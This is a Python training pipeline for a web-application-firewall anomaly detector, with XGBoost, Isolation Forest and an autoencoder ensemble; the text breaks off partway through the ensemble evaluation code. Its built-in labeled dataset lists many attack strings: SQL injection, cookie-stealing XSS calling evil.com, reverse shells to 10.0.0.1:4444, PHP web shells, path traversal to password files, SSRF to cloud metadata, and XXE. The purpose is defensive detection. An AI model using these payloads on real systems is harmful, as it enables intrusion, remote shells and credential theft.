#!/usr/bin/env python3
"""
DECEPTICON Ensemble ML Training Pipeline
=========================================
Naval SWAVLAMBAN 2025 Challenge 3 - Adaptive Anomaly Detection

This module implements:
- Supervised learning (XGBoost) for known attack classification
- Unsupervised learning (Isolation Forest) for anomaly detection  
- Semi-supervised learning (Autoencoder) for baseline learning
- Ensemble voting for robust predictions

All models are exported to ONNX format for secure inference (no pickle RCE).

Author: DECEPTICON Team
Date: December 2025
"""

import os
import sys
import json
import time
import hashlib
import logging
import warnings
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime

import numpy as np
import pandas as pd
from collections import Counter

# ML Libraries
from sklearn.model_selection import train_test_split, StratifiedKFold, cross_val_score
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.metrics import (
    classification_report, confusion_matrix, roc_auc_score,
    precision_recall_curve, f1_score, accuracy_score
)
from sklearn.ensemble import IsolationForest, RandomForestClassifier, VotingClassifier
from sklearn.svm import OneClassSVM

# XGBoost
try:
    import xgboost as xgb
    XGBOOST_AVAILABLE = True
except ImportError:
    XGBOOST_AVAILABLE = False
    print("⚠️  XGBoost not available - using RandomForest instead")

# LightGBM (optional, faster)
try:
    import lightgbm as lgb
    LIGHTGBM_AVAILABLE = True
except ImportError:
    LIGHTGBM_AVAILABLE = False

# PyTorch for Autoencoder
try:
    import torch
    import torch.nn as nn
    import torch.optim as optim
    from torch.utils.data import DataLoader, TensorDataset
    TORCH_AVAILABLE = True
except ImportError:
    TORCH_AVAILABLE = False
    print("⚠️  PyTorch not available - Autoencoder disabled")

# ONNX export
try:
    import onnx
    from skl2onnx import convert_sklearn
    from skl2onnx.common.data_types import FloatTensorType
    ONNX_AVAILABLE = True
except ImportError:
    ONNX_AVAILABLE = False
    print("⚠️  ONNX libraries not available - will save as numpy format")

# Add project root
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ml.feature_extraction import FeatureExtractor

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("decepticon.ml.ensemble_trainer")


# ============================================================================
# CONFIGURATION
# ============================================================================

@dataclass
class TrainingConfig:
    """Training configuration with sensible defaults"""
    # Data splits
    test_size: float = 0.2
    val_size: float = 0.15
    random_state: int = 42
    
    # Early stopping
    early_stopping_rounds: int = 50
    early_stopping_patience: int = 10
    min_delta: float = 0.001
    
    # Model hyperparameters
    isolation_forest_contamination: float = 0.1
    isolation_forest_n_estimators: int = 200
    
    xgboost_n_estimators: int = 500
    xgboost_max_depth: int = 8
    xgboost_learning_rate: float = 0.05
    
    autoencoder_hidden_dims: List[int] = field(default_factory=lambda: [32, 16, 8, 16, 32])
    autoencoder_epochs: int = 200
    autoencoder_batch_size: int = 64
    autoencoder_learning_rate: float = 0.001
    
    # Ensemble weights
    ensemble_weights: Dict[str, float] = field(default_factory=lambda: {
        'xgboost': 0.4,
        'isolation_forest': 0.3,
        'autoencoder': 0.3
    })
    
    # Output
    models_dir: str = "./models"
    

# ============================================================================
# DATASETS - Attack Payloads for Training
# ============================================================================

class AttackDatasetGenerator:
    """
    Generates training datasets from attack payloads
    
    Supports:
    - Built-in attack payloads (SQLi, XSS, RCE, etc.)
    - External datasets (CICIDS, CSIC HTTP)
    - Custom payload files
    """
    
    # Comprehensive attack payloads
    ATTACK_PAYLOADS = {
        'sqli': [
            # Basic SQLi
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "admin'--", "admin' #", "admin'/*", "' OR 'x'='x",
            "1' AND '1'='1", "1' AND 1=1--", "1 OR 1=1", "1' OR '1'='1'--",
            # UNION-based
            "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "1' UNION SELECT 1,@@version--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            # Error-based
            "' AND 1=CONVERT(int,@@version)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            # Time-based blind
            "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "1' AND (SELECT SLEEP(5))--",
            # Stacked queries
            "'; DROP TABLE users;--", 
            "'; INSERT INTO users VALUES('hacker','pass');--",
            # Boolean-based blind
            "' AND 1=1--", "' AND 1=2--", 
            "' AND SUBSTRING(@@version,1,1)='5'--",
            # Advanced
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
            "-1' UNION SELECT LOAD_FILE('/etc/passwd')--",
            "1'; EXEC xp_cmdshell('whoami');--",
            # Encoded
            "%27%20OR%201%3D1--", "&#39; OR 1=1--",
            "' %4fR 1=1--", "' o/**/r 1=1--",
            # PostgreSQL specific
            "'; SELECT pg_sleep(5);--",
            "' AND 1=CAST((SELECT version()) AS int)--",
            # MySQL specific
            "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # SQLite specific
            "' AND 1=1 UNION SELECT sql FROM sqlite_master--",
            # NoSQL (MongoDB)
            "'; return db.users.find();", 
            "{\"$gt\": \"\"}", 
            "{\"$ne\": null}",
            "'; return this.password; '",
        ],
        
        'xss': [
            # Basic script tags
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script src=//evil.com/xss.js></script>",
            "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            # Event handlers
            "<img src=x onerror=alert(1)>",
            "<img/src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<div onmouseover=alert(1)>hover me</div>",
            # JavaScript protocol
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "<a href=javascript:alert(1)>click</a>",
            "<iframe src=javascript:alert(1)>",
            # Data URI
            "<object data=data:text/html,<script>alert(1)</script>>",
            "<embed src=data:text/html,<script>alert(1)</script>>",
            # SVG-based
            "<svg><script>alert(1)</script></svg>",
            "<svg><animate onbegin=alert(1)>",
            "<svg><set onbegin=alert(1)>",
            # Filter bypass
            "<ScRiPt>alert(1)</ScRiPt>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<<script>script>alert(1)<</script>/script>",
            # DOM-based
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>",
            # Template injection
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}", "#{alert(1)}",
            # Angular
            "{{$on.constructor('alert(1)')()}}",
            # Vue
            "{{_c.constructor('alert(1)')()}}",
        ],
        
        'rce': [
            # Command injection
            "; ls -la", "| ls -la", "& ls -la", "&& ls -la",
            "|| ls -la", "`ls -la`", "$(ls -la)",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; whoami", "| whoami", "&& whoami",
            # Windows
            "& dir", "| dir", "&& dir", "|| dir",
            "& type C:\\windows\\win.ini",
            # Reverse shells
            "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "; nc -e /bin/sh 10.0.0.1 4444",
            "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            # PHP
            "<?php system($_GET['cmd']); ?>",
            "<?php eval($_POST['code']); ?>",
            "<?=`$_GET[0]`?>",
            # Python
            "__import__('os').system('id')",
            "eval(compile('import os; os.system(\"id\")', '<string>', 'exec'))",
            # Node.js
            "require('child_process').exec('id')",
            "process.binding('spawn_sync').spawn({file:'/bin/sh',args:['-c','id']})",
            # Ruby
            "`id`", "system('id')", "exec('id')",
            # Java
            "Runtime.getRuntime().exec('id')",
        ],
        
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd%00",
            "..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id",
        ],
        
        'ssrf': [
            "http://localhost/admin",
            "http://127.0.0.1/admin",
            "http://[::1]/admin",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://100.100.100.200/",
            "file:///etc/passwd",
            "dict://localhost:11211/stat",
            "gopher://localhost:6379/_INFO",
            "http://0.0.0.0/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "http://localhost:22/",
            "http://internal-service.local/",
        ],
        
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],
        
        'ldap_injection': [
            "*)(&", "*)(uid=*))(|(uid=*",
            "admin)(&)", "admin)(|(password=*))",
            "*)(cn=*", "*))(|(cn=*",
        ],
        
        'header_injection': [
            "test\r\nX-Injected: header",
            "test%0d%0aX-Injected:%20header",
            "test\nX-Injected: header",
            "test%0aX-Injected:%20header",
        ],
        
        'log_injection': [
            "test\nFake log entry: admin logged in",
            "test%0aFake%20log%20entry",
            "test\r\n[INFO] Admin authenticated",
        ],
    }
    
    # Benign traffic patterns
    BENIGN_PATTERNS = [
        # Normal search queries
        "search?q=python+tutorial", "search?q=best+restaurants+nearby",
        "search?q=how+to+cook+pasta", "search?q=weather+forecast",
        "search?q=news+today", "search?q=machine+learning+basics",
        # API calls
        "api/users/123", "api/products?page=1&limit=20",
        "api/orders/456/items", "api/v2/users?status=active",
        "api/search?term=laptop&category=electronics",
        # Form data
        "email=user@example.com&password=SecurePass123",
        "name=John+Doe&phone=1234567890&address=123+Main+St",
        "username=john_doe&remember=true",
        # Normal paths
        "/index.html", "/about-us", "/contact", "/products/shoes",
        "/blog/2024/12/my-article", "/images/logo.png",
        "/static/js/app.js", "/css/style.css",
        # JSON payloads
        '{"name": "John", "age": 30, "city": "New York"}',
        '{"items": [1, 2, 3], "total": 6}',
        '{"user": {"id": 123, "email": "test@test.com"}}',
        # Normal headers
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "application/json", "text/html,application/xhtml+xml",
        # Base64 (legitimate)
        "data=SGVsbG8gV29ybGQ=",  # "Hello World"
        # URL parameters
        "page=1&sort=date&order=desc",
        "category=books&author=Smith&year=2024",
        # Long but normal content
        "description=" + "This is a normal product description. " * 10,
    ]
    
    def __init__(self, feature_extractor: FeatureExtractor = None):
        self.feature_extractor = feature_extractor or FeatureExtractor()
        
    def generate_dataset(self, 
                         samples_per_category: int = 500,
                         augment: bool = True,
                         noise_level: float = 0.1) -> Tuple[np.ndarray, np.ndarray, List[str]]:
        """
        Generate training dataset with features and labels
        
        Returns:
            X: Feature matrix (n_samples, n_features)
            y: Labels (n_samples,) - 0 for benign, 1+ for attack categories
            categories: List of category names
        """
        X_list = []
        y_list = []
        categories = ['benign'] + list(self.ATTACK_PAYLOADS.keys())
        
        logger.info(f"Generating dataset with {samples_per_category} samples per category...")
        
        # Generate benign samples
        benign_samples = self._generate_benign_samples(samples_per_category, augment)
        for sample in benign_samples:
            features = self._extract_features(sample)
            if features is not None:
                X_list.append(features)
                y_list.append(0)  # Benign = 0
        
        logger.info(f"  Generated {len(y_list)} benign samples")
        
        # Generate attack samples
        for cat_idx, (category, payloads) in enumerate(self.ATTACK_PAYLOADS.items(), start=1):
            attack_samples = self._generate_attack_samples(
                payloads, samples_per_category, augment
            )
            
            count = 0
            for sample in attack_samples:
                features = self._extract_features(sample)
                if features is not None:
                    X_list.append(features)
                    y_list.append(cat_idx)
                    count += 1
            
            logger.info(f"  Generated {count} samples for {category}")
        
        X = np.array(X_list, dtype=np.float32)
        y = np.array(y_list, dtype=np.int32)
        
        # Add noise for robustness
        if noise_level > 0:
            noise = np.random.normal(0, noise_level, X.shape)
            X = X + noise.astype(np.float32)
        
        logger.info(f"Dataset generated: {X.shape[0]} samples, {X.shape[1]} features")
        
        return X, y, categories
    
    def _generate_benign_samples(self, n_samples: int, augment: bool) -> List[str]:
        """Generate benign traffic samples with augmentation"""
        samples = []
        base_samples = self.BENIGN_PATTERNS.copy()
        
        while len(samples) < n_samples:
            for pattern in base_samples:
                if len(samples) >= n_samples:
                    break
                samples.append(pattern)
                
                if augment and len(samples) < n_samples:
                    # Augmentation: add variations
                    samples.extend(self._augment_benign(pattern)[:3])
        
        return samples[:n_samples]
    
    def _generate_attack_samples(self, payloads: List[str], 
                                  n_samples: int, augment: bool) -> List[str]:
        """Generate attack samples with augmentation"""
        samples = []
        
        while len(samples) < n_samples:
            for payload in payloads:
                if len(samples) >= n_samples:
                    break
                samples.append(payload)
                
                if augment and len(samples) < n_samples:
                    # Augmentation: encoding variations
                    samples.extend(self._augment_attack(payload)[:5])
        
        return samples[:n_samples]
    
    def _augment_benign(self, pattern: str) -> List[str]:
        """Create benign variations"""
        variations = []
        
        # Case variations
        variations.append(pattern.lower())
        variations.append(pattern.upper())
        
        # Add random parameters
        variations.append(pattern + "&timestamp=" + str(int(time.time())))
        variations.append(pattern + "&_=" + str(np.random.randint(1000000)))
        
        # Add whitespace
        variations.append(" " + pattern + " ")
        
        return variations
    
    def _augment_attack(self, payload: str) -> List[str]:
        """Create attack variations (evasion techniques)"""
        variations = []
        
        # URL encoding
        import urllib.parse
        variations.append(urllib.parse.quote(payload))
        variations.append(urllib.parse.quote_plus(payload))
        
        # Double encoding
        variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # Case variations
        variations.append(payload.upper())
        variations.append(payload.lower())
        variations.append(''.join(c.upper() if i % 2 == 0 else c.lower() 
                                  for i, c in enumerate(payload)))
        
        # Comment insertion (for SQL/XSS)
        if any(kw in payload.lower() for kw in ['select', 'union', 'script']):
            variations.append(payload.replace(' ', '/**/'  ))
            variations.append(payload.replace(' ', '%20'))
        
        # Null byte injection
        variations.append(payload + '%00')
        variations.append(payload + '\x00')
        
        # Tab/newline variations
        variations.append(payload.replace(' ', '\t'))
        variations.append(payload.replace(' ', '\n'))
        
        return variations
    
    def _extract_features(self, payload: str) -> Optional[np.ndarray]:
        """Extract features from payload using FeatureExtractor"""
        try:
            # Create mock request context
            from core.models import RequestContext
            
            ctx = RequestContext(
                request_id="train",
                timestamp=time.time(),
                client_ip="127.0.0.1",
                client_port=12345,
                server_ip="127.0.0.1",
                server_port=80,
                method="GET",
                path="/test",
                query_string=payload if '=' in payload else f"q={payload}",
                headers={"user-agent": "TrainingBot/1.0"},
                body=payload if not '=' in payload else "",
            )
            
            feature_vec = self.feature_extractor.extract(ctx)
            return feature_vec.features
            
        except Exception as e:
            logger.debug(f"Feature extraction failed for payload: {e}")
            return None
    
    def load_external_dataset(self, filepath: str) -> Tuple[np.ndarray, np.ndarray]:
        """
        Load external dataset (CSV format)
        
        Expected columns: payload, label (or features columns)
        """
        df = pd.read_csv(filepath)
        
        if 'features' in df.columns:
            # Pre-extracted features
            X = df[[c for c in df.columns if c.startswith('feature_')]].values
            y = df['label'].values
        else:
            # Raw payloads - need feature extraction
            X_list = []
            y_list = []
            
            for _, row in df.iterrows():
                features = self._extract_features(row['payload'])
                if features is not None:
                    X_list.append(features)
                    y_list.append(row['label'])
            
            X = np.array(X_list)
            y = np.array(y_list)
        
        return X, y


# ============================================================================
# AUTOENCODER MODEL (PyTorch)
# ============================================================================

if TORCH_AVAILABLE:
    class WAFAutoencoder(nn.Module):
        """
        Autoencoder for anomaly detection
        
        Learns to reconstruct normal traffic.
        High reconstruction error = anomaly.
        """
        
        def __init__(self, input_dim: int, hidden_dims: List[int] = None):
            super().__init__()
            
            if hidden_dims is None:
                hidden_dims = [32, 16, 8, 16, 32]
            
            # Build encoder
            encoder_layers = []
            prev_dim = input_dim
            
            for i, dim in enumerate(hidden_dims[:len(hidden_dims)//2 + 1]):
                encoder_layers.append(nn.Linear(prev_dim, dim))
                encoder_layers.append(nn.BatchNorm1d(dim))
                encoder_layers.append(nn.ReLU())
                encoder_layers.append(nn.Dropout(0.2))
                prev_dim = dim
            
            self.encoder = nn.Sequential(*encoder_layers)
            
            # Latent dimension
            self.latent_dim = hidden_dims[len(hidden_dims)//2]
            
            # Build decoder
            decoder_layers = []
            
            for i, dim in enumerate(hidden_dims[len(hidden_dims)//2 + 1:]):
                decoder_layers.append(nn.Linear(prev_dim, dim))
                decoder_layers.append(nn.BatchNorm1d(dim))
                decoder_layers.append(nn.ReLU())
                decoder_layers.append(nn.Dropout(0.2))
                prev_dim = dim
            
            # Output layer
            decoder_layers.append(nn.Linear(prev_dim, input_dim))
            
            self.decoder = nn.Sequential(*decoder_layers)
        
        def forward(self, x):
            encoded = self.encoder(x)
            decoded = self.decoder(encoded)
            return decoded
        
        def encode(self, x):
            return self.encoder(x)
        
        def get_reconstruction_error(self, x):
            """Get reconstruction error for anomaly scoring"""
            with torch.no_grad():
                reconstructed = self.forward(x)
                error = torch.mean((x - reconstructed) ** 2, dim=1)
            return error


# ============================================================================
# ENSEMBLE TRAINER
# ============================================================================

class EnsembleTrainer:
    """
    Trains ensemble of ML models for WAF anomaly detection
    
    Components:
    1. Isolation Forest (unsupervised) - Fast anomaly detection
    2. XGBoost (supervised) - Known attack classification  
    3. Autoencoder (semi-supervised) - Baseline learning
    
    All models exported to ONNX for secure inference.
    """
    
    def __init__(self, config: TrainingConfig = None):
        self.config = config or TrainingConfig()
        self.models_dir = Path(self.config.models_dir)
        self.models_dir.mkdir(parents=True, exist_ok=True)
        
        # Models
        self.isolation_forest = None
        self.classifier = None  # XGBoost or RandomForest
        self.autoencoder = None
        self.scaler = StandardScaler()
        self.label_encoder = LabelEncoder()
        
        # Training history
        self.history = {
            'train_loss': [],
            'val_loss': [],
            'train_accuracy': [],
            'val_accuracy': [],
            'best_val_loss': float('inf'),
            'best_epoch': 0
        }
        
        # Feature info
        self.n_features = None
        self.categories = None
        
    def train(self, 
              X: np.ndarray, 
              y: np.ndarray, 
              categories: List[str],
              use_early_stopping: bool = True) -> Dict[str, Any]:
        """
        Train all ensemble models
        
        Args:
            X: Feature matrix
            y: Labels (0=benign, 1+=attack categories)
            categories: Category names
            use_early_stopping: Enable early stopping for deep learning
            
        Returns:
            Training results dict
        """
        self.n_features = X.shape[1]
        self.categories = categories
        
        logger.info(f"Training ensemble on {X.shape[0]} samples, {X.shape[1]} features")
        logger.info(f"Categories: {categories}")
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X, y, 
            test_size=self.config.test_size,
            random_state=self.config.random_state,
            stratify=y
        )
        
        X_train, X_val, y_train, y_val = train_test_split(
            X_train, y_train,
            test_size=self.config.val_size,
            random_state=self.config.random_state,
            stratify=y_train
        )
        
        logger.info(f"Train: {len(y_train)}, Val: {len(y_val)}, Test: {len(y_test)}")
        
        # Scale features
        X_train_scaled = self.scaler.fit_transform(X_train)
        X_val_scaled = self.scaler.transform(X_val)
        X_test_scaled = self.scaler.transform(X_test)
        
        # Binary labels for anomaly detection (0=benign, 1=attack)
        y_train_binary = (y_train > 0).astype(int)
        y_val_binary = (y_val > 0).astype(int)
        y_test_binary = (y_test > 0).astype(int)
        
        results = {}
        
        # 1. Train Isolation Forest (Unsupervised)
        logger.info("\n" + "="*60)
        logger.info("Training Isolation Forest...")
        logger.info("="*60)
        
        results['isolation_forest'] = self._train_isolation_forest(
            X_train_scaled, y_train_binary, X_val_scaled, y_val_binary
        )
        
        # 2. Train XGBoost/RandomForest (Supervised)
        logger.info("\n" + "="*60)
        logger.info("Training Classifier (XGBoost/RandomForest)...")
        logger.info("="*60)
        
        results['classifier'] = self._train_classifier(
            X_train_scaled, y_train,
            X_val_scaled, y_val,
            use_early_stopping
        )
        
        # 3. Train Autoencoder (Semi-supervised)
        if TORCH_AVAILABLE:
            logger.info("\n" + "="*60)
            logger.info("Training Autoencoder...")
            logger.info("="*60)
            
            # Train only on benign samples
            X_train_benign = X_train_scaled[y_train == 0]
            
            results['autoencoder'] = self._train_autoencoder(
                X_train_benign, X_val_scaled, y_val_binary,
                use_early_stopping
            )
        else:
            logger.warning("Autoencoder skipped (PyTorch not available)")
            results['autoencoder'] = {'status': 'skipped'}
        
        # 4. Evaluate ensemble on test set
        logger.info("\n" + "="*60)
        logger.info("Evaluating Ensemble...")
        logger.info("="*60)
        
        results['ensemble'] = self._evaluate_ensemble(
            X_test_scaled, y_test, y_test_binary
        )
        
        # Save models
        self._save_models()
        
        return results
    
    def _train_isolation_forest(self, 
                                 X_train: np.ndarray, y_train: np.ndarray,
                                 X_val: np.ndarray, y_val: np.ndarray) -> Dict:
        """Train Isolation Forest for anomaly detection"""
        
        self.isolation_forest = IsolationForest(
            n_estimators=self.config.isolation_forest_n_estimators,
            contamination=self.config.isolation_forest_contamination,
            random_state=self.config.random_state,
            n_jobs=-1
        )
        
        # Train on all data (unsupervised)
        start_time = time.time()
        self.isolation_forest.fit(X_train)
        train_time = time.time() - start_time
        
        # Evaluate
        y_pred_train = self.isolation_forest.predict(X_train)
        y_pred_val = self.isolation_forest.predict(X_val)
        
        # Convert: -1 (anomaly) -> 1 (attack), 1 (normal) -> 0 (benign)
        y_pred_train_binary = (y_pred_train == -1).astype(int)
        y_pred_val_binary = (y_pred_val == -1).astype(int)
        
        train_f1 = f1_score(y_train, y_pred_train_binary)
        val_f1 = f1_score(y_val, y_pred_val_binary)
        
        logger.info(f"  Training time: {train_time:.2f}s")
        logger.info(f"  Train F1: {train_f1:.4f}")
        logger.info(f"  Val F1: {val_f1:.4f}")
        
        return {
            'train_time': train_time,
            'train_f1': train_f1,
            'val_f1': val_f1,
        }
    
    def _train_classifier(self,
                          X_train: np.ndarray, y_train: np.ndarray,
                          X_val: np.ndarray, y_val: np.ndarray,
                          use_early_stopping: bool) -> Dict:
        """Train XGBoost or RandomForest classifier"""
        
        start_time = time.time()
        
        if XGBOOST_AVAILABLE:
            # XGBoost with early stopping
            self.classifier = xgb.XGBClassifier(
                n_estimators=self.config.xgboost_n_estimators,
                max_depth=self.config.xgboost_max_depth,
                learning_rate=self.config.xgboost_learning_rate,
                random_state=self.config.random_state,
                n_jobs=-1,
                eval_metric='mlogloss',
                use_label_encoder=False
            )
            
            if use_early_stopping:
                self.classifier.fit(
                    X_train, y_train,
                    eval_set=[(X_val, y_val)],
                    verbose=False
                )
            else:
                self.classifier.fit(X_train, y_train)
                
            model_type = 'XGBoost'
        else:
            # Fallback to RandomForest
            self.classifier = RandomForestClassifier(
                n_estimators=200,
                max_depth=self.config.xgboost_max_depth,
                random_state=self.config.random_state,
                n_jobs=-1
            )
            self.classifier.fit(X_train, y_train)
            model_type = 'RandomForest'
        
        train_time = time.time() - start_time
        
        # Evaluate
        y_pred_train = self.classifier.predict(X_train)
        y_pred_val = self.classifier.predict(X_val)
        
        train_acc = accuracy_score(y_train, y_pred_train)
        val_acc = accuracy_score(y_val, y_pred_val)
        
        train_f1 = f1_score(y_train, y_pred_train, average='weighted')
        val_f1 = f1_score(y_val, y_pred_val, average='weighted')
        
        logger.info(f"  Model: {model_type}")
        logger.info(f"  Training time: {train_time:.2f}s")
        logger.info(f"  Train Accuracy: {train_acc:.4f}")
        logger.info(f"  Val Accuracy: {val_acc:.4f}")
        logger.info(f"  Train F1: {train_f1:.4f}")
        logger.info(f"  Val F1: {val_f1:.4f}")
        
        # Feature importance
        if hasattr(self.classifier, 'feature_importances_'):
            importance = self.classifier.feature_importances_
            top_features = np.argsort(importance)[-10:][::-1]
            logger.info(f"  Top features: {top_features}")
        
        return {
            'model_type': model_type,
            'train_time': train_time,
            'train_accuracy': train_acc,
            'val_accuracy': val_acc,
            'train_f1': train_f1,
            'val_f1': val_f1,
        }
    
    def _train_autoencoder(self,
                           X_train_benign: np.ndarray,
                           X_val: np.ndarray, y_val: np.ndarray,
                           use_early_stopping: bool) -> Dict:
        """Train Autoencoder on benign traffic"""
        
        if not TORCH_AVAILABLE:
            return {'status': 'skipped', 'reason': 'PyTorch not available'}
        
        # Create model
        self.autoencoder = WAFAutoencoder(
            input_dim=X_train_benign.shape[1],
            hidden_dims=self.config.autoencoder_hidden_dims
        )
        
        # Data loaders
        train_tensor = torch.FloatTensor(X_train_benign)
        train_dataset = TensorDataset(train_tensor, train_tensor)
        train_loader = DataLoader(
            train_dataset, 
            batch_size=self.config.autoencoder_batch_size,
            shuffle=True
        )
        
        val_tensor = torch.FloatTensor(X_val)
        
        # Training
        criterion = nn.MSELoss()
        optimizer = optim.Adam(
            self.autoencoder.parameters(), 
            lr=self.config.autoencoder_learning_rate
        )
        scheduler = optim.lr_scheduler.ReduceLROnPlateau(
            optimizer, mode='min', factor=0.5, patience=5
        )
        
        best_val_loss = float('inf')
        patience_counter = 0
        
        start_time = time.time()
        
        for epoch in range(self.config.autoencoder_epochs):
            # Training
            self.autoencoder.train()
            train_loss = 0.0
            
            for batch_x, _ in train_loader:
                optimizer.zero_grad()
                reconstructed = self.autoencoder(batch_x)
                loss = criterion(reconstructed, batch_x)
                loss.backward()
                optimizer.step()
                train_loss += loss.item()
            
            train_loss /= len(train_loader)
            
            # Validation
            self.autoencoder.eval()
            with torch.no_grad():
                val_reconstructed = self.autoencoder(val_tensor)
                val_loss = criterion(val_reconstructed, val_tensor).item()
            
            scheduler.step(val_loss)
            
            self.history['train_loss'].append(train_loss)
            self.history['val_loss'].append(val_loss)
            
            # Early stopping
            if use_early_stopping:
                if val_loss < best_val_loss - self.config.min_delta:
                    best_val_loss = val_loss
                    self.history['best_val_loss'] = val_loss
                    self.history['best_epoch'] = epoch
                    patience_counter = 0
                    # Save best model
                    best_state = self.autoencoder.state_dict()
                else:
                    patience_counter += 1
                
                if patience_counter >= self.config.early_stopping_patience:
                    logger.info(f"  Early stopping at epoch {epoch}")
                    self.autoencoder.load_state_dict(best_state)
                    break
            
            if epoch % 20 == 0:
                logger.info(f"  Epoch {epoch}: train_loss={train_loss:.6f}, val_loss={val_loss:.6f}")
        
        train_time = time.time() - start_time
        
        # Evaluate anomaly detection
        self.autoencoder.eval()
        with torch.no_grad():
            reconstruction_errors = self.autoencoder.get_reconstruction_error(val_tensor)
        
        # Find threshold (95th percentile of benign errors)
        benign_errors = reconstruction_errors[y_val == 0].numpy()
        threshold = np.percentile(benign_errors, 95)
        
        # Predict
        y_pred = (reconstruction_errors.numpy() > threshold).astype(int)
        
        val_f1 = f1_score(y_val, y_pred)
        
        logger.info(f"  Training time: {train_time:.2f}s")
        logger.info(f"  Best val loss: {best_val_loss:.6f} at epoch {self.history['best_epoch']}")
        logger.info(f"  Anomaly threshold: {threshold:.6f}")
        logger.info(f"  Val F1: {val_f1:.4f}")
        
        # Store threshold
        self.autoencoder_threshold = threshold
        
        return {
            'train_time': train_time,
            'best_val_loss': best_val_loss,
            'best_epoch': self.history['best_epoch'],
            'threshold': float(threshold),
            'val_f1': val_f1,
        }
    
    def _evaluate_ensemble(self, 
                           X_test: np.ndarray, 
                           y_test: np.ndarray,
                           y_test_binary: np.ndarray) -> Dict:
        """Evaluate ensemble on test set"""
        
        # Get predictions from each model
        predictions = {}
        scores = {}
        
        # Isolation Forest
        if_pred = self.isolation_forest.predict(X_test)
        if_pred_binary = (if_pred == -1).astype(int)
        if_scores = -self.isolation_forest.score_samples(X_test)  # Higher = more anomalous
        predictions['isolation_forest'] = if_pred_binary
        scores['isolation_forest'] = if_scores
        
        # Classifier
        clf_pred = self.classifier.predict(X_test)
        clf_pred_binary = (clf_pred > 0).astype(int)
        clf_proba = self.classifier.predict_proba(X_test)
        clf_scores = 1 - clf_proba[:, 0]  # P(attack)
        predictions['classifier'] = clf_pred
        predictions['classifier_binary'] = clf_pred_binary
        scores['classifier'] = clf_scores
        
        # Autoencoder
        if TORCH_AVAILABLE and self.autoencoder is not None:
            self.autoencoder.eval()
            with torch.no_grad():
                X_tensor = torch.FloatTensor(X_test)
                ae_errors = self.autoencoder.get_reconstruction_error(X_tensor).numpy()
            
            ae_pred_binary = (ae_errors > self.autoencoder_threshold).astype(int)
            predictions['autoencoder'] = ae_pred_binary
            scores['autoencoder'] = ae_errors
        
        # Ensemble voting (weighted)
        weights = self.config.ensemble_weights
        
        ensemble_scores = np.zeros(len(y_test))
        
        # Normalize scores to [0, 1]
        for model, model_scores in scores.items():
            if model in weights:
                normalized = (model_scores - model_scores.min()) / (model_scores.max() - model_scores.min() + 1e-8)
                ensemble_scores += weights[model] * normalized
        
        # Binary prediction (threshold = 0.5)
        ensemble_pred_binary = (ensemble_scores > 0.5).astype(int)
        
        # Metrics
        results = {}
        
        # Per-model metrics
        for model, pred in predictions.items():
